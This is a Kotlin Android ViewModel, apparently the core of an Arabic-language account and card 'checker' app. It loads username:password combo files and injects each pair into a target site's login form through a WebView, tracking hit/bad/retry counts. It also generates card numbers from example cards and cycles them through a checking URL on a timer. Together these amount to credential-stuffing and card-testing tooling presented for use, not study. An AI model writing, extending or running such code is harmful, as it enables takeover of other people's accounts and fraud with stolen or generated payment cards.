package com.example

import android.content.ContentResolver
import android.net.Uri
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import okhttp3.FormBody
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.BufferedReader
import java.io.InputStreamReader
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger

data class LogItem(
    val id: Int,
    val timestamp: String,
    val info: String,
    val status: String // SUCCESS, FAILED, RETRY, ERROR
)

data class Stats(
    val hit: Int = 0,
    val bad: Int = 0,
    val retry: Int = 0,
    val unknown: Int = 0,
    val total: Int = 0
)

data class CheckerState(
    val loginUrl: String = "",
    val separator: String = ":",
    val delaySeconds: Int = 1,
    val threadCount: Int = 1,
    val selectedFileName: String = "لم يتم اختيار ملف",
    val selectedFileUri: Uri? = null,
    val isRunning: Boolean = false,
    val isPaused: Boolean = false,
    val stats: Stats = Stats(),
    val logs: List<LogItem> = emptyList(),
    val latestResponseHtml: String = "",
    val currentAccountUsername: String = "",
    val currentAccountPassword: String = "",
    val currentIndex: Int = 0,
    val totalCount: Int = 0,
    val testUrlTrigger: Long = 0L,
    val isDesktopMode: Boolean = false,
    val primaryColorHex: String = "#6750A4",
    val pageLoadedTrigger: Long = 0L
)

data class GeneratorState(
    val exampleCards: String = "",
    val count: String = "10",
    val generatedCards: String = "",
    val errorMessage: String? = null
)

data class WebCheckerState(
    val cardsToCheck: String = "",
    val checkUrl: String = "",
    val delaySeconds: String = "3",
    val isChecking: Boolean = false,
    val currentIndex: Int = 0,
    val currentCard: String = "",
    val totalCount: Int = 0
)

class CheckerViewModel : ViewModel() {
    private val _state = MutableStateFlow(CheckerState())
    val state: StateFlow<CheckerState> = _state.asStateFlow()

    private val _genState = MutableStateFlow(GeneratorState())
    val genState: StateFlow<GeneratorState> = _genState.asStateFlow()

    private val _webState = MutableStateFlow(WebCheckerState())
    val webState: StateFlow<WebCheckerState> = _webState.asStateFlow()

    fun updateState(transform: CheckerState.() -> CheckerState) {
        _state.update(transform)
    }

    private val patternAnalyzer = PatternAnalyzer()
    private var webJob: Job? = null

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    private var checkingJob: Job? = null
    private var pausedFlag = false
    private var stopFlag = false

    private val logsMutex = Mutex()
    private val statsMutex = Mutex()
    private var logCounter = AtomicInteger(0)

    private var accountsQueue = mutableListOf<String>()
    private val queueMutex = Mutex()

    fun updateUrl(url: String) = _state.update { it.copy(loginUrl = url) }
    fun updateSeparator(sep: String) = _state.update { it.copy(separator = sep) }
    fun updateDelay(delay: Int) = _state.update { it.copy(delaySeconds = delay) }
    fun updateThreadCount(count: Int) = _state.update { it.copy(threadCount = count) }
    fun fileSelected(uri: Uri, name: String) = _state.update {
        it.copy(selectedFileUri = uri, selectedFileName = name)
    }

    suspend fun testConnection(): String {
        _state.update { it.copy(testUrlTrigger = System.currentTimeMillis()) }
        return "جاري فتح الرابط في المتصفح الحي..."
    }

    fun startChecking(contentResolver: ContentResolver) {
        val currentState = _state.value
        if (currentState.isRunning || currentState.selectedFileUri == null || currentState.loginUrl.isEmpty()) return

        stopFlag = false
        pausedFlag = false

        _state.update {
            it.copy(
                isRunning = true,
                isPaused = false,
                stats = Stats(),
                logs = emptyList(), // Clear previous logs
                currentIndex = 0,
                totalCount = 0
            )
        }
        logCounter.set(0)

        checkingJob = viewModelScope.launch(Dispatchers.IO) {
            // Read lines
            try {
                accountsQueue.clear()
                contentResolver.openInputStream(currentState.selectedFileUri)?.use { inputStream ->
                    val reader = BufferedReader(InputStreamReader(inputStream))
                    var line: String?
                    while (reader.readLine().also { line = it } != null) {
                        if (line!!.isNotBlank()) accountsQueue.add(line!!)
                    }
                }
            } catch (e: Exception) {
                addLog("خطأ في الملف: ${e.localizedMessage}", "ERROR")
                stopCheckingInternal()
                return@launch
            }

            _state.update { it.copy(totalCount = accountsQueue.size) }

            // Launch single worker since it's UI driven
            launch { workerRoutine() }.join()

            // When all done:
            withContext(Dispatchers.Main) {
                stopCheckingInternal()
                addLog("اكتمل الفحص.", "INFO")
            }
        }
    }

    private suspend fun workerRoutine() {
        var index = 0
        while (currentCoroutineContext().isActive && !stopFlag) {
            if (pausedFlag) {
                delay(500)
                continue
            }

            val account = queueMutex.withLock {
                if (accountsQueue.isEmpty()) null else accountsQueue.removeAt(0)
            } ?: break

            index++
            val sep = if (_state.value.separator == "Tab") "\t" else _state.value.separator
            val parts = account.split(sep, limit = 2)
            
            if (parts.size < 2) {
                updateStats { it.copy(bad = it.bad + 1, total = it.total + 1) }
                addLog("تنسيق غير صالح: $account", "FAILED")
                _state.update { it.copy(currentIndex = index) }
                continue
            }

            val username = parts[0].trim()
            val password = parts[1].trim()

            // Update UI State to trigger WebView load and injection
            _state.update { 
                it.copy(
                    currentAccountUsername = username,
                    currentAccountPassword = password,
                    currentIndex = index,
                    pageLoadedTrigger = 0L // reset trigger
                ) 
            }
            
            addLog("يتم ملء حقول: $username", "INFO")

            // Wait for WebView to finish loading (up to 15 seconds)
            var waited = 0
            while (_state.value.pageLoadedTrigger == 0L && waited < 150 && !stopFlag && !pausedFlag) {
                delay(100)
                waited++
            }
            
            // Now apply the user's requested delay
            delay(_state.value.delaySeconds * 1000L)
            
            updateStats { it.copy(total = it.total + 1, unknown = it.unknown + 1) } // Default state since we don't automatically check hit/bad anymore, or we can just leave it as total
        }
    }

    private suspend fun updateStats(transform: (Stats) -> Stats) {
        statsMutex.withLock {
            _state.update { it.copy(stats = transform(it.stats)) }
        }
    }

    private suspend fun addLog(info: String, status: String) {
        val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        val item = LogItem(
            id = logCounter.incrementAndGet(),
            timestamp = time,
            info = info,
            status = status
        )
        logsMutex.withLock {
            _state.update {
                // Keep the last 1000 items to avoid unhandled memory growth in UI
                val newLogs = it.logs.toMutableList()
                newLogs.add(item)
                if (newLogs.size > 1000) newLogs.removeAt(0)
                it.copy(logs = newLogs)
            }
        }
    }

    fun pauseChecking() {
        if (_state.value.isRunning) {
            pausedFlag = true
            _state.update { it.copy(isPaused = true) }
        }
    }

    fun resumeChecking() {
        if (_state.value.isRunning && pausedFlag) {
            pausedFlag = false
            _state.update { it.copy(isPaused = false) }
        }
    }

    fun stopChecking() {
        stopFlag = true
        stopCheckingInternal()
    }

    private fun stopCheckingInternal() {
        checkingJob?.cancel()
        _state.update { it.copy(isRunning = false, isPaused = false) }
    }

    // --- Generator Functions ---
    fun updateExampleCards(text: String) { _genState.update { it.copy(exampleCards = text) } }
    fun updateGenCount(count: String) { _genState.update { it.copy(count = count) } }
    
    fun generateCards() {
        try {
            val examples = _genState.value.exampleCards.lines().filter { it.isNotBlank() }.map { it.trim() }
            if (examples.isEmpty()) {
                _genState.update { it.copy(errorMessage = "يرجى إدخال 1 مثال على الأقل.") }
                return
            }
            val count = _genState.value.count.toIntOrNull() ?: 10
            val generated = patternAnalyzer.generateCards(examples, count)
            _genState.update { it.copy(generatedCards = generated.joinToString("\n"), errorMessage = null) }
        } catch (e: Exception) {
            _genState.update { it.copy(errorMessage = e.message) }
        }
    }
    
    fun setWebCheckerCards(cards: String) {
        _webState.update { it.copy(cardsToCheck = cards) }
    }
    
    // --- Web Checker Functions ---
    fun updateWebUrl(url: String) { _webState.update { it.copy(checkUrl = url) } }
    fun updateWebCards(cards: String) { _webState.update { it.copy(cardsToCheck = cards) } }
    fun updateWebDelay(delay: String) { _webState.update { it.copy(delaySeconds = delay) } }
    
    fun startWebChecking() {
        if (_webState.value.isChecking) return
        val cardsList = _webState.value.cardsToCheck.lines().filter { it.isNotBlank() }.map { it.trim() }
        if (cardsList.isEmpty() || _webState.value.checkUrl.isBlank()) return
        
        val delaySecs = _webState.value.delaySeconds.toLongOrNull() ?: 3L
        
        _webState.update { 
            it.copy(
                isChecking = true, 
                totalCount = cardsList.size, 
                currentIndex = 0,
                currentCard = cardsList.firstOrNull() ?: ""
            ) 
        }
        
        webJob = viewModelScope.launch(Dispatchers.Main) { 
            for (i in cardsList.indices) {
                if (!isActive) break
                val card = cardsList[i]
                _webState.update { it.copy(currentIndex = i + 1, currentCard = card) }
                
                // WebView UI will observe currentCard and URL and load automatically
                delay(delaySecs * 1000)
            }
            _webState.update { it.copy(isChecking = false, currentCard = "تم الانتهاء من الفحص.") }
        }
    }
    
    fun stopWebChecking() {
        webJob?.cancel()
        _webState.update { it.copy(isChecking = false) }
    }
}

